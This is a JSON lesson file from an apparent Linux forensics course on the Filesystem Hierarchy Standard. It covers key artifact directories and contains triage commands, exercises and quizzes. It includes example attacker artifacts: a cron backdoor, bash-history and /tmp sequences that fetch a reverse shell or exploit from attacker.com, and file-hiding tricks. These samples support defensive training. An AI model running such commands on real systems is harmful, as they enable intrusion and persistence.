{
  "lesson_id": "a34e619c-156e-4abc-9de7-98a21f93bb5a",
  "domain": "dfir",
  "title": "Linux Root Directory Structure and File Hierarchy",
  "difficulty": 1,
  "order_index": 72,
  "prerequisites": [
    "a1b2c3d4-e5f6-4a7b-8c9d-0e1f2a3b4c5d"
  ],
  "concepts": [
    "Filesystem Hierarchy Standard (FHS)",
    "Root Directory Structure",
    "Critical Forensic Directories",
    "Hidden Files and Directories",
    "Symbolic Links",
    "Mount Points",
    "Temporary Filesystems",
    "Key Artifact Locations"
  ],
  "estimated_time": 45,
  "learning_objectives": [
    "Navigate the Linux filesystem hierarchy with confidence",
    "Identify high-value forensic directories and their contents",
    "Locate hidden files and directories used by attackers",
    "Understand symbolic links and how they can hide artifacts",
    "Recognize mount points and external storage",
    "Map forensic artifacts to their standard locations",
    "Apply the FHS knowledge to any Linux distribution"
  ],
  "post_assessment": [
    {
      "question": "Which directory contains system-wide configuration files and is one of the MOST valuable locations for forensic artifacts?",
      "options": [
        "/usr - user programs",
        "/etc - configuration files",
        "/opt - optional software",
        "/bin - user binaries"
      ],
      "correct_answer": 1,
      "difficulty": 1,
      "type": "multiple_choice",
      "question_id": "76d9651d-8181-4a39-91e8-1bd3b9793aa6",
      "explanation": "Explanation not provided."
    },
    {
      "question": "An attacker created a hidden directory called '.backup' in /tmp to store malicious tools. Why is this location particularly risky for forensic preservation?",
      "options": [
        "/tmp is always backed up automatically",
        "/tmp may be mounted as tmpfs (RAM disk) and cleared on reboot",
        "/tmp files are encrypted by default",
        "/tmp is read-only"
      ],
      "correct_answer": 1,
      "difficulty": 2,
      "type": "multiple_choice",
      "question_id": "72dd099c-a0d7-45b2-9ad0-3f56764c0a5f",
      "explanation": "Explanation not provided."
    },
    {
      "question": "You find a file at /usr/local/bin/update_system that is actually a symbolic link pointing to /tmp/malware. What does this indicate?",
      "options": [
        "This is normal system behavior",
        "Possible persistence mechanism - legitimate-looking name points to malicious file",
        "The system is corrupted and needs reinstall",
        "This is a backup file"
      ],
      "correct_answer": 1,
      "difficulty": 2,
      "type": "multiple_choice",
      "question_id": "1ea2b56c-2b0d-4428-95b9-0203de4db12c",
      "explanation": "Explanation not provided."
    }
  ],
  "jim_kwik_principles": [
    "active_learning",
    "minimum_effective_dose",
    "teach_like_im_10",
    "memory_hooks",
    "meta_learning",
    "connect_to_what_i_know",
    "reframe_limiting_beliefs",
    "gamify_it",
    "learning_sprint",
    "multiple_memory_pathways"
  ],
  "content_blocks": [
    {
      "type": "mindset_coach",
      "content": {
        "text": "You're about to learn the single most important skill in Linux forensics: knowing EXACTLY where to find evidence. While Windows investigators memorize C:\\Windows\\System32 and Registry hives, Linux investigators master the Filesystem Hierarchy Standard - a universal map that works across virtually ALL Linux systems.\n\nHere's what makes this powerful: Unlike Windows where important files can be scattered across Program Files, AppData, Windows, and System32, Linux follows a strict organizational structure. Configuration files? /etc. Logs? /var/log. User data? /home. Temporary files? /tmp. Once you learn this hierarchy, you can walk into ANY Linux system - Ubuntu server, CentOS firewall, Debian web server, embedded router - and immediately know where to look.\n\nMany investigators feel overwhelmed by the Linux command line. Here's the truth: You don't need to be a Linux expert to conduct excellent forensics. You need to know WHERE artifacts live and HOW to extract them. This lesson gives you that map. By the end, you'll look at a Linux filesystem and instantly recognize high-value targets, hidden attacker staging areas, and critical log locations.\n\nThink of the Linux filesystem like a city with strict zoning laws: residential areas (/home), government buildings (/etc for configurations), industrial zones (/usr for applications), temporary storage facilities (/tmp), and historical archives (/var/log). Once you know the layout, you navigate efficiently. Attackers know this layout too - they hide in predictable places, use predictable tactics. You're learning to think like both a forensic investigator and an adversary.\n\nThis lesson is hands-on. You'll see real directory structures, examine actual artifacts, and practice navigation commands. By the end, the Linux filesystem will feel as familiar as your own neighborhood. Let's begin the tour."
      }
    },
    {
      "type": "explanation",
      "content": {
        "text": "# The Filesystem Hierarchy Standard (FHS)\n\n## What is the FHS?\n\nThe **Filesystem Hierarchy Standard (FHS)** is a reference specification maintained by the Linux Foundation that defines the directory structure and directory contents in Unix-like operating systems. Think of it as the \"building code\" that all Linux distributions follow.\n\n**Why it matters for forensics**: Whether you're investigating Ubuntu, CentOS, Debian, or even embedded Linux systems, the FHS ensures that:\n- Configuration files are in /etc\n- Logs are in /var/log  \n- User home directories are in /home\n- System binaries are in /bin and /sbin\n\nThis standardization is your advantage - learn it once, apply it everywhere.\n\n## The Root Directory: Everything Starts at /\n\nIn Linux, **/** (pronounced \"root\" or \"slash\") is the top of the filesystem hierarchy. EVERYTHING exists under /. There is no C: drive or D: drive like Windows.\n\n```\n/                           ← The root of EVERYTHING\n├── bin/                    ← Essential user binaries\n├── boot/                   ← Boot loader, kernel\n├── dev/                    ← Device files  \n├── etc/                    ← Configuration files\n├── home/                   ← User home directories\n├── lib/                    ← Shared libraries\n├── media/                  ← Removable media mount points\n├── mnt/                    ← Temporary mount points\n├── opt/                    ← Optional add-on applications\n├── proc/                   ← Virtual filesystem (process info)\n├── root/                   ← Root user's home directory\n├── run/                    ← Runtime variable data\n├── sbin/                   ← System administration binaries\n├── srv/                    ← Service data\n├── sys/                    ← Virtual filesystem (hardware info)\n├── tmp/                    ← Temporary files\n├── usr/                    ← User utilities and applications  \n└── var/                    ← Variable data (logs, databases)\n```\n\n**Memory Aid**: Think of / as the \"lobby\" of a building, with different floors (directories) for different purposes.\n\n## Critical Directories for Forensics\n\n### /etc - Configuration Heaven\n\n**/etc** (\"et-see\" or \"et-cetera\") contains ALL system-wide configuration files.\n\n**Forensic Value**: 🔥🔥🔥🔥🔥 (Highest)\n\n**Key Files**:\n\n```bash\n/etc/\n├── passwd              # User accounts (not passwords)\n├── shadow              # Actual password hashes (requires root)\n├── group               # Group definitions\n├── sudoers             # Sudo permissions\n├── ssh/                # SSH server configuration\n│   ├── sshd_config     # SSH daemon config\n│   └── ssh_host_*      # SSH host keys\n├── cron*               # Scheduled tasks (MAJOR persistence vector)\n│   ├── crontab         # System-wide cron jobs\n│   ├── cron.d/         # Per-package cron jobs\n│   ├── cron.daily/     # Scripts run daily\n│   ├── cron.hourly/    # Scripts run hourly\n│   ├── cron.weekly/    # Scripts run weekly\n│   └── cron.monthly/   # Scripts run monthly\n├── systemd/            # systemd service configurations\n│   └── system/         # System service units\n├── init.d/             # Legacy init scripts (older systems)\n├── rc.local            # Script run at boot (persistence!)\n├── hosts               # Static hostname to IP mappings\n├── resolv.conf         # DNS configuration\n├── network/            # Network configuration (Debian/Ubuntu)\n│   └── interfaces\n├── sysconfig/          # Network configuration (Red Hat/CentOS)\n│   └── network-scripts/\n├── fstab               # Filesystem mount table\n├── hostname            # System hostname\n├── os-release          # Distribution identification\n└── profile             # System-wide environment variables\n```\n\n**Example Investigation**:\n\n```bash\n# Check for unauthorized user accounts\ncat /etc/passwd | grep -v \"nologin\\|false\" | grep -v \"^#\"\n\n# Check sudo permissions\ncat /etc/sudoers\nsudo cat /etc/sudoers.d/*\n\n# Check for persistence in cron\ncat /etc/crontab\nls -la /etc/cron.*\nfor user in $(cut -d: -f1 /etc/passwd); do echo \"--- $user ---\"; crontab -u $user -l 2>/dev/null; done\n\n# Check SSH configuration\ncat /etc/ssh/sshd_config | grep -v \"^#\" | grep -v \"^$\"\n\n# Check systemd services\nsystemctl list-unit-files --type=service | grep enabled\n```\n\n**Real-World Artifact**: Attacker added persistence via /etc/cron.d/system_update:\n```bash\n# /etc/cron.d/system_update\n*/10 * * * * root /tmp/.update >/dev/null 2>&1\n```\nThis runs /tmp/.update every 10 minutes as root - classic backdoor.\n\n### /var - The Evidence Goldmine\n\n**/var** (\"variable\") contains files that change during system operation: logs, databases, mail, web content.\n\n**Forensic Value**: 🔥🔥🔥🔥🔥 (Highest)\n\n**Key Subdirectories**:\n\n```bash\n/var/\n├── log/                # LOGS - YOUR PRIMARY EVIDENCE SOURCE\n│   ├── auth.log        # Authentication logs (Debian/Ubuntu)\n│   ├── secure          # Authentication logs (Red Hat/CentOS)\n│   ├── syslog          # System messages\n│   ├── kern.log        # Kernel messages\n│   ├── messages        # General system messages\n│   ├── wtmp            # Login records (binary)\n│   ├── btmp            # Failed login records (binary)\n│   ├── lastlog         # Last login per user (binary)\n│   ├── dpkg.log        # Debian package manager log\n│   ├── yum.log         # Red Hat package manager log\n│   ├── audit/          # auditd logs\n│   ├── apache2/        # Apache web server logs\n│   ├── nginx/          # Nginx web server logs\n│   └── mysql/          # MySQL database logs\n├── spool/              # Spooling directories\n│   ├── cron/           # Per-user crontabs\n│   │   └── crontabs/   # Individual user crontab files\n│   ├── mail/           # User email\n│   └── at/             # At job scheduling\n├── tmp/                # Temporary files (may persist across reboots)\n├── www/                # Web server content (varies by distro)\n│   └── html/           # Default web root\n├── lib/                # State information\n│   ├── dpkg/           # Debian package database\n│   ├── rpm/            # Red Hat package database\n│   └── mysql/          # MySQL database files\n└── cache/              # Application cache data\n└── apt/            # APT package cache (Debian/Ubuntu)\n```\n\n**Example Investigation**:\n\n```bash\n# Check authentication logs for brute force\ngrep \"Failed password\" /var/log/auth.log | head -20\ngrep \"Accepted password\" /var/log/auth.log | tail -20\n\n# Check system logs for suspicious activity\ngrep -i \"error\\|fail\\|warn\" /var/log/syslog | tail -50\n\n# View login history\nlast -f /var/log/wtmp | head -20          # Successful logins\nlastb -f /var/log/btmp | head -20         # Failed logins\nlastlog                                    # Last login per user\n\n# Check web server access logs\ncat /var/log/apache2/access.log | tail -100\ncat /var/log/nginx/access.log | tail -100\n\n# Check for suspicious web requests\ngrep -E \"(union|select|script|exec|\\.\\./)\" /var/log/apache2/access.log\n\n# Check per-user crontabs\nls -la /var/spool/cron/crontabs/\ncat /var/spool/cron/crontabs/*\n```\n\n**Critical Note**: /var/log files can be HUGE. Use tail, head, and grep efficiently.\n\n### /home - User Territory\n\n**/home** contains user home directories: /home/username/\n\n**Forensic Value**: 🔥🔥🔥🔥 (Very High)\n\n**Key Locations per User**:\n\n```bash\n/home/username/\n├── .bash_history       # Command history (GOLD)\n├── .bash_profile       # User shell login script\n├── .bashrc             # User shell configuration\n├── .profile            # User environment variables\n├── .ssh/               # SSH keys and configuration\n│   ├── authorized_keys # Public keys allowed to login\n│   ├── known_hosts     # Previously connected hosts\n│   ├── id_rsa          # Private SSH key\n│   └── id_rsa.pub      # Public SSH key\n├── .gnupg/             # GPG keys\n├── .cache/             # Application cache\n├── .config/            # Application configurations\n├── .local/             # User-local data\n│   └── share/\n├── Downloads/          # Downloaded files\n├── Documents/          # User documents\n└── .*                  # Hidden files (start with .)\n```\n\n**Example Investigation**:\n\n```bash\n# Check all user bash histories\nfor user_home in /home/*; do\necho \"=== $(basename $user_home) ===\"\ncat \"$user_home/.bash_history\" 2>/dev/null | tail -50\ndone\n\n# Check SSH authorized keys (backdoors)\nfind /home -name \"authorized_keys\" -exec sh -c 'echo \"File: {}\"; cat \"{}\"' \\;\n\n# Check for suspicious files in user directories\nfind /home -name \"*.sh\" -o -name \"*.py\" -o -name \"*.pl\" -o -name \"nc\" 2>/dev/null\n\n# Check for recently modified files\nfind /home -type f -mtime -7 -ls 2>/dev/null | head -50\n\n# Check hidden directories (common hiding spots)\nfind /home -type d -name \".*\" -ls 2>/dev/null\n```\n\n**Real-World Example**: Attacker's .bash_history shows:\n```bash\nwget http://attacker.com/reverse_shell.py\npython3 reverse_shell.py 203.0.113.50 4444\nrm reverse_shell.py\nhistory -c  # Attempted to clear (but file already written)\n```bash\n\n### /root - The Superuser's Home\n\n**/root** is the home directory for the root user (NOT the same as /).\n\n**Forensic Value**: 🔥🔥🔥🔥🔥 (Highest - root activity is critical)\n\n**Contents**: Same as /home/username but for root:\n- .bash_history - Root's command history\n- .ssh/ - Root's SSH keys and authorized_keys\n- .bashrc, .profile - Root's shell configuration\n- Any tools, scripts, or files root used\n\n**Example Investigation**:\n\n```bash\n# Check root's command history\nsudo cat /root/.bash_history | tail -100\n\n# Check root's SSH keys\nsudo ls -la /root/.ssh/\nsudo cat /root/.ssh/authorized_keys\n\n# Check for suspicious files in root's home\nsudo find /root -type f -mtime -30 -ls\n\n# Check root's crontab\nsudo crontab -l\n```\n\n**Why it matters**: If attacker gained root access, /root/.bash_history shows EXACTLY what they did with elevated privileges.\n\n### /tmp - The Temporary Danger Zone\n\n**/tmp** stores temporary files. **Critical**: Often mounted as tmpfs (RAM disk) and cleared on reboot!\n\n**Forensic Value**: 🔥🔥🔥 (High - but volatile!)\n\n**Characteristics**:\n- **World-writable**: Any user can create files\n- **Attacker staging area**: Common place to download tools, compile exploits\n- **Volatile**: May be tmpfs (cleared on reboot)\n- **Hidden files**: Attackers use hidden directories (.hidden_dir)\n\n**Example Investigation**:\n\n```bash\n# Check if /tmp is tmpfs (RAM disk)\nmount | grep /tmp\ndf -h /tmp\n\n# List all files (including hidden)\nls -la /tmp/\n\n# Find recently created files\nfind /tmp -type f -mtime -1 -ls\n\n# Find suspicious filenames\nfind /tmp -name \".*\" -ls                    # Hidden files\nfind /tmp -name \"*shell*\" -o -name \"*backdoor*\" -o -name \"*exploit*\" -ls\n\n# Find executable files\nfind /tmp -type f -executable -ls\n\n# Check for unusual extensions\nfind /tmp -type f \\( -name \"*.sh\" -o -name \"*.py\" -o -name \"*.pl\" -o -name \"*.elf\" \\) -ls\n```\n\n**Real-World Pattern**: Attacker workflow in /tmp:\n```bash\ncd /tmp\nwget http://attacker.com/exploit.c\ngcc exploit.c -o .systemd      # Hidden name\nchmod +x .systemd\n./.systemd                      # Run exploit\nrm exploit.c                    # Clean up source\n```\n\n**CRITICAL**: If /tmp is tmpfs, acquire memory or collect files BEFORE reboot!\n\n### /proc - The Virtual Process Filesystem\n\n**/proc** is a **virtual filesystem** (doesn't exist on disk) that exposes kernel and process information.\n\n**Forensic Value**: 🔥🔥🔥🔥 (Very High - for live systems)\n\n**Key Locations**:\n\n```bash\n/proc/\n├── [PID]/              # Directory per running process\n│   ├── cmdline         # Command line that started process\n│   ├── cwd -> /path    # Current working directory (symlink)\n│   ├── environ         # Environment variables\n│   ├── exe -> /path    # Executable path (symlink)\n│   ├── fd/             # Open file descriptors\n│   ├── maps            # Memory mappings\n│   ├── status          # Process status\n│   └── net/            # Network info for this process\n├── cpuinfo             # CPU information\n├── meminfo             # Memory information\n├── version             # Kernel version\n├── mounts              # Mounted filesystems\n├── net/                # Network information\n│   ├── tcp             # TCP connections\n│   ├── udp             # UDP connections\n│   └── unix            # Unix sockets\n└── sys/                # Kernel parameters\n```\n\n**Example Investigation**:\n\n```bash\n# Find process by name\nps aux | grep suspicious_process\n# Assume PID is 1234\n\n# Investigate process 1234\nls -l /proc/1234/exe        # Where is the binary?\ncat /proc/1234/cmdline      # How was it started?\ncat /proc/1234/environ      # Environment variables\nls -l /proc/1234/cwd        # Current working directory\nls -l /proc/1234/fd         # Open files\n\n# Check network connections\ncat /proc/net/tcp | grep 1234\nnetstat -anp | grep 1234\n\n# List all processes and their executables\nfor pid in /proc/[0-9]*; do\necho \"$pid: $(readlink $pid/exe 2>/dev/null)\"\ndone | grep -v \"Permission denied\"\n```\n\n**Real-World Example**: Suspicious process analysis:\n```bash\nps aux | grep \"\\.systemd\"\n# root  12345  ... /tmp/.systemd\n\nls -l /proc/12345/exe\n# /proc/12345/exe -> /tmp/.systemd (deleted)\n# ^^ \"(deleted)\" means binary was removed from disk but still running!\n\ncat /proc/12345/cmdline\n# /tmp/.systemd--reverse_shell\n\ncat /proc/net/tcp | grep $(printf '%04X' 12345)\n# Shows connection to 203.0.113.50:4444\n```\n\nThis reveals a deleted reverse shell still running in memory!\n\n### /dev/shm - Shared Memory (Another Temp Danger Zone)\n\n**/dev/shm** is a tmpfs filesystem for shared memory. Like /tmp, it's:\n- RAM-based (volatile)\n- World-writable\n- Cleared on reboot\n- Often overlooked by investigators\n\n**Forensic Value**: 🔥🔥🔥 (High - less monitored than /tmp)\n\n```bash\n# Check what's in shared memory\nls -la /dev/shm/\n\n# Find executable files\nfind /dev/shm -type f -executable -ls\n\n# Check recent activity\nfind /dev/shm -type f -mtime -1 -ls\n```\n\n**Why attackers love it**: Many monitoring tools watch /tmp but ignore /dev/shm.\n\n### /bin, /sbin, /usr/bin, /usr/sbin - System Binaries\n\n**Forensic Value**: 🔥🔥 (Medium - trojanized binaries)\n\n- **/bin**: Essential user commands (ls, cat, bash)\n- **/sbin**: System administration commands (fsck, reboot)\n- **/usr/bin**: Non-essential user commands\n- **/usr/sbin**: Non-essential system admin commands\n\n**Check for trojanized binaries**:\n\n```bash\n# Compare file sizes/dates to known good system\nls -lh /bin/ls /bin/cat /bin/bash\nls -lh /usr/bin/ssh /usr/bin/scp\n\n# Check for unusual SUID binaries (run as root)\nfind / -perm -4000 -ls 2>/dev/null\n\n# Verify binary integrity (if you have hashes)\nmd5sum /bin/* | grep -v \"expected_hash\"\n\n# Check for recently modified binaries\nfind /bin /sbin /usr/bin /usr/sbin -type f -mtime -30 -ls\n```\n\n**Real-World Example**: Trojanized /bin/ls that also logs commands to attacker.\n\n## Hidden Files and Directories\n\nIn Linux, files/directories starting with **.** (dot) are hidden from normal ls listings.\n\n**Attacker Tactics**:\n\n```bash\n# Create hidden directory in /tmp\nmkdir /tmp/.hidden\n\n# Create hidden files\ntouch /tmp/.config\ntouch /tmp/...\n\n# Create file with space after name (hard to see)\ntouch \"systemd \"\n\n# Create file with unusual characters\ntouch \"$(printf '\\u200b')backdoor\"  # Zero-width space\n```\n\n**Detection**:\n\n```bash\n# Show ALL files including hidden\nls -la\n\n# Find all hidden files\nfind / -name \".*\" -ls 2>/dev/null\n\n# Find files with spaces or unusual characters\nfind / -name \"* \" -ls 2>/dev/null\nfind / -name \"*$(printf '\\t')*\" -ls 2>/dev/null\n\n# Find files with suspicious names\nfind / -iname \"*backdoor*\" -o -iname \"*shell*\" -o -iname \"*pwn*\" 2>/dev/null\n```bash\n\n## Symbolic Links: Following the Trail\n\nSymbolic links (symlinks) are pointers to other files/directories.\n\n**Forensic Implications**:\n\n```bash\n# Create symlink for persistence\nln -s /tmp/malware /usr/local/bin/update_check\n# Now \"update_check\" looks legitimate but runs malware\n\n# Find all symlinks\nfind / -type l -ls 2>/dev/null\n\n# Find broken symlinks (target deleted)\nfind / -xtype l -ls 2>/dev/null\n\n# Check where a symlink points\nls -l /usr/local/bin/update_check\n# lrwxrwxrwx 1 root root 13 Oct 30 14:00 /usr/local/bin/update_check -> /tmp/malware\n\nreadlink /usr/local/bin/update_check\n# /tmp/malware\n```bash\n\n## Mount Points: External Storage\n\nMounted filesystems can be local disks, USB drives, network shares, or remote filesystems.\n\n**Check Mounted Filesystems**:\n\n```bash\n# Show all mounted filesystems\nmount\ncat /proc/mounts\ndf -h\n\n# Check for NFS mounts (network)\nmount | grep nfs\n\n# Check for USB drives\nlsblk\nfdisk -l\n\n# Check mount history in logs\ngrep -i \"mount\" /var/log/syslog\n```\n\n**Forensic Value**: Attackers may:\n- Mount USB drives to exfiltrate data\n- Mount network shares for lateral movement  \n- Mount encrypted containers to hide data\n\n## Directory Permissions and Ownership\n\n```bash\n# Check directory permissions\nls -ld /etc /var/log /tmp\n\ndrwxr-xr-x 2 root root 4096 Oct 30 /etc      # root owns, others can read\ndrwxr-xr-x 2 root root 4096 Oct 30 /var/log  # root owns, others can read  \ndrwxrwxrwt 2 root root 4096 Oct 30 /tmp      # sticky bit (t) - special\n```\n\n**Sticky Bit on /tmp**: The **t** means only file owner can delete their files (even though directory is world-writable).\n\n## Forensic Investigation Workflow\n\n**Step 1: Identify High-Value Directories (BETH VR)**\n```bash\nls -la /boot /etc /tmp /home /var /root\n```\n\n**Step 2: Check Logs**\n```bash\nls -lht /var/log | head -20    # Most recently modified logs\ntail -100 /var/log/auth.log\ntail -100 /var/log/syslog\n```\n\n**Step 3: Check User Activity**\n```bash\ncat /home/*/.bash_history\nsudo cat /root/.bash_history\nlast\nlastlog\n```\n\n**Step 4: Check Persistence**\n```bash\ncat /etc/crontab\nls -la /etc/cron.*\nls -la /var/spool/cron/crontabs/\nsystemctl list-unit-files | grep enabled\n```\n\n**Step 5: Check Temporary Locations**\n```bash\nls -la /tmp\nls -la /dev/shm\nls -la /var/tmp\n```\n\n**Step 6: Check Running Processes**\n```bash\nps aux\nls -l /proc/*/exe\nnetstat -antp\n```bash\n\n## Key Takeaways\n\n1. **FHS is your map**: /etc = configs, /var/log = logs, /home = users, /tmp = temporary\n2. **BETH VR directories** contain 90% of forensic artifacts\n3. **/var/log is CRITICAL**: Authentication, system messages, package installs, web access\n4. **Hidden files matter**: ls -la shows files starting with .\n5. **/tmp and /dev/shm are volatile**: May be tmpfs (RAM), collect before reboot\n6. **/proc is virtual**: Exposes live process information\n7. **Symlinks can hide**: Follow links to find real targets\n8. **Mount points matter**: Check for external storage, network shares\n9. **Root's home is /root**: Not /, contains root user's bash_history and files\n10. **World-writable directories** (/tmp, /dev/shm) are attacker staging areas"
      }
    },
    {
      "type": "code_exercise",
      "content": {
        "text": "# Hands-On: Linux Directory Navigation\n\n## Exercise 1: Directory Exploration\n\n```bash\n# Navigate to root\ncd /\n\n# List all top-level directories\nls -lh\n\n# Count files in each directory\nfor dir in /*; do\necho \"$dir: $(find \"$dir\" -type f 2>/dev/null | wc -l) files\"\ndone\n\n# Find largest directories\ndu -sh /* 2>/dev/null | sort -rh | head -10\n\n# Check filesystem usage\ndf -h\n```bash\n\n## Exercise 2: Log Analysis\n\n```bash\n# Go to log directory\ncd /var/log\n\n# List logs by modification time (most recent first)\nls -lht | head -20\n\n# Check log sizes\ndu -sh * | sort -rh | head -10\n\n# View authentication logs (Ubuntu/Debian)\ntail -100 auth.log 2>/dev/null\n\n# View authentication logs (CentOS/Red Hat)\ntail -100 secure 2>/dev/null\n\n# Search for failed logins\ngrep \"Failed password\" auth.log 2>/dev/null | tail -20\ngrep \"Failed password\" secure 2>/dev/null | tail -20\n\n# Search for successful logins\ngrep \"Accepted password\" auth.log 2>/dev/null | tail -20\n\n# View system messages\ntail -100 syslog 2>/dev/null\ntail -100 messages 2>/dev/null\n```bash\n\n## Exercise 3: User Home Directory Investigation\n\n```bash\n# List all user home directories\nls -la /home/\n\n# Check each user's bash history\nfor user_home in /home/*; do\nusername=$(basename \"$user_home\")\necho \"\\n=== $username ===\"\ncat \"$user_home/.bash_history\" 2>/dev/null | tail -20\ndone\n\n# Find SSH keys\nfind /home -name \"id_rsa\" -o -name \"id_dsa\" -o -name \"id_ecdsa\" 2>/dev/null\n\n# Check authorized SSH keys\nfind /home -name \"authorized_keys\" -exec sh -c 'echo \"\\nFile: {}\"; cat \"{}\"' \\; 2>/dev/null\n\n# Find recently modified files in home directories\nfind /home -type f -mtime -7 -ls 2>/dev/null | head -30\n\n# Find hidden directories\nfind /home -type d -name \".*\" -ls 2>/dev/null\n```bash\n\n## Exercise 4: Root User Investigation\n\n```bash\n# Check root's bash history\nsudo cat /root/.bash_history | tail -50\n\n# Check root's SSH authorized keys\nsudo cat /root/.ssh/authorized_keys 2>/dev/null\n\n# Check root's crontab\nsudo crontab -l\n\n# Find files in /root\nsudo find /root -type f -ls | head -20\n\n# Check root's environment\nsudo cat /root/.bashrc\nsudo cat /root/.profile\n```bash\n\n## Exercise 5: Temporary Directory Investigation\n\n```bash\n# Check if /tmp is tmpfs\nmount | grep \" /tmp \"\ndf -h /tmp\n\n# List all files in /tmp (including hidden)\nls -la /tmp/\n\n# Find executable files in /tmp\nfind /tmp -type f -executable -ls\n\n# Find recently created files\nfind /tmp -type f -mtime -1 -ls\n\n# Find hidden files/directories\nfind /tmp -name \".*\" -ls\n\n# Check /dev/shm\nls -la /dev/shm/\nfind /dev/shm -type f -ls\n\n# Check /var/tmp (usually persists across reboots)\nls -la /var/tmp/\nfind /var/tmp -type f -mtime -7 -ls\n```bash\n\n## Exercise 6: Configuration File Analysis\n\n```bash\n# Check system cron jobs\ncat /etc/crontab\nls -la /etc/cron.d/\nls -la /etc/cron.daily/\nls -la /etc/cron.hourly/\nls -la /etc/cron.weekly/\n\n# Check per-user crontabs\nsudo ls -la /var/spool/cron/crontabs/\nsudo cat /var/spool/cron/crontabs/* 2>/dev/null\n\n# Check systemd services\nsystemctl list-unit-files --type=service | grep enabled\nls -la /etc/systemd/system/*.service\n\n# Check legacy init scripts\nls -la /etc/init.d/\n\n# Check SSH configuration\ncat /etc/ssh/sshd_config | grep -v \"^#\" | grep -v \"^$\"\n\n# Check sudo configuration\nsudo cat /etc/sudoers\nsudo ls -la /etc/sudoers.d/\n\n# Check user accounts\ncat /etc/passwd | column -t -s:\ncat /etc/group | column -t -s:\n```bash\n\n## Exercise 7: Process and /proc Investigation\n\n```bash\n# List running processes\nps aux | head -20\n\n# Find processes by specific user\nps aux | grep \"^username\"\n\n# For each process, show executable path\nfor pid in /proc/[0-9]*; do\npid_num=$(basename \"$pid\")\nexe=$(readlink \"$pid/exe\" 2>/dev/null)\n[ -n \"$exe\" ] && echo \"PID $pid_num: $exe\"\ndone | head -20\n\n# Investigate specific process (replace 1234 with actual PID)\nPID=1234\nls -l /proc/$PID/exe\ncat /proc/$PID/cmdline | tr '\\0' ' '\necho\ncat /proc/$PID/environ | tr '\\0' '\\n'\nls -l /proc/$PID/cwd\nls -l /proc/$PID/fd\n\n# Check network connections\ncat /proc/net/tcp\nnetstat -antp 2>/dev/null | grep ESTABLISHED\nss -antp | grep ESTAB\n```bash\n\n## Exercise 8: Finding Hidden and Suspicious Files\n\n```bash\n# Find all hidden files/directories\nfind / -name \".*\" -ls 2>/dev/null | head -50\n\n# Find files with suspicious names\nfind / -iname \"*backdoor*\" -o -iname \"*shell*\" -o -iname \"*pwn*\" -o -iname \"*hack*\" 2>/dev/null\n\n# Find SUID binaries (run with elevated privileges)\nfind / -perm -4000 -ls 2>/dev/null\n\n# Find SGID binaries\nfind / -perm -2000 -ls 2>/dev/null\n\n# Find world-writable files\nfind / -type f -perm -002 -ls 2>/dev/null | head -50\n\n# Find world-writable directories\nfind / -type d -perm -002 -ls 2>/dev/null | head -50\n\n# Find files modified in last 24 hours\nfind / -type f -mtime -1 -ls 2>/dev/null | head -50\n\n# Find files owned by specific user\nfind / -user username -ls 2>/dev/null | head -50\n```bash\n\n## Exercise 9: Symbolic Link Investigation\n\n```bash\n# Find all symbolic links\nfind / -type l -ls 2>/dev/null | head -50\n\n# Find broken symbolic links (target doesn't exist)\nfind / -xtype l -ls 2>/dev/null\n\n# Check where important links point\nls -l /bin/sh\nls -l /usr/bin/python\nls -l /etc/alternatives/*\n\n# Find symbolic links in /usr/local/bin (common persistence)\nfind /usr/local/bin -type l -ls\n```bash\n\n## Exercise 10: Mount Point Investigation\n\n```bash\n# Show all mounted filesystems\nmount\ncat /proc/mounts\ndf -h\n\n# Show block devices\nlsblk\n\n# Check for NFS mounts\nmount | grep nfs\n\n# Check for CIFS/SMB mounts\nmount | grep cifs\n\n# Check /etc/fstab for persistent mounts\ncat /etc/fstab\n\n# Check mount history in logs\ngrep -i \"mount\" /var/log/syslog 2>/dev/null | tail -20\ngrep -i \"mount\" /var/log/messages 2>/dev/null | tail -20\n```bash\n\n## Exercise 11: Quick Triage Script\n\n```bash\n# !/bin/bash\n# linux_dir_triage.sh - Quick directory triage\n\necho \"=== Linux Directory Triage ===\"\necho \"\"\n\necho \"[*] Top-level Directory Structure\"\nls -lh /\necho \"\"\n\necho \"[*] Disk Usage\"\ndf -h\necho \"\"\n\necho \"[*] Most Recent Logs\"\nls -lht /var/log | head -10\necho \"\"\n\necho \"[*] Recent Authentication Activity\"\ntail -20 /var/log/auth.log 2>/dev/null || tail -20 /var/log/secure 2>/dev/null\necho \"\"\n\necho \"[*] User Home Directories\"\nls -la /home/\necho \"\"\n\necho \"[*] /tmp Contents\"\nls -la /tmp/ | head -20\necho \"\"\n\necho \"[*] /dev/shm Contents\"\nls -la /dev/shm/\necho \"\"\n\necho \"[*] System Crontabs\"\ncat /etc/crontab 2>/dev/null\necho \"\"\n\necho \"[*] Enabled Services\"\nsystemctl list-unit-files --type=service --state=enabled 2>/dev/null | head -15\necho \"\"\n\necho \"[*] Active Network Connections\"\nnetstat -antp 2>/dev/null | grep ESTABLISHED | head -10\necho \"\"\n\necho \"[*] Recently Modified Files in /etc\"\nfind /etc -type f -mtime -7 -ls 2>/dev/null | head -15\necho \"\"\n\necho \"=== Triage Complete ===\"\n```\n\nSave and run:\n```bash\nchmod +x linux_dir_triage.sh\nsudo ./linux_dir_triage.sh > triage_output.txt\n```"
      }
    },
    {
      "type": "memory_aid",
      "content": {
        "text": "# Memory Aids for Linux Directory Structure\n\n## Mnemonic: \"BETH VR\" - High-Value Forensic Directories\n\nRemember these six critical directories:\n\n- **B** = /Boot - Bootloader, kernel files\n- **E** = /Etc - Configuration files (cron, ssh, services)\n- **T** = /Tmp - Temporary files (attacker staging)\n- **H** = /Home - User home directories\n- **V** = /Var - Variable data (LOGS!)\n- **R** = /Root - Root user's home\n\n**Story**: \"Beth is in VR\" - these directories are your virtual reality for investigations!\n\n## Visual: The Linux House Analogy\n\n```\n/  (Root - The Foundation)\n|\n+-----------+-----------+\n|           |           |\n/etc        /var        /home\n(Blueprints) (Storage)  (Bedrooms)\n|            |           |\nConfigs      Logs      User Files\nCron        Databases  .bash_history\nServices    Mail      .ssh/\n```\n\n- **/** = Foundation (everything builds from here)\n- **/etc** = Blueprints (how the house is configured)\n- **/var** = Storage room (logs, databases, changing data)\n- **/home** = Bedrooms (each user has their own space)\n- **/tmp** = Garage (temporary storage, may be cleared)\n- **/root** = Master bedroom (root user's private space)\n- **/bin** = Kitchen (essential tools everyone uses)\n- **/proc** = Windows (view what's currently happening)\n\n## Mnemonic: \"LOGS\" for /var/log Key Files\n\n- **L** = Login logs (wtmp, btmp, lastlog)\n- **O** = Operating system logs (syslog, messages, 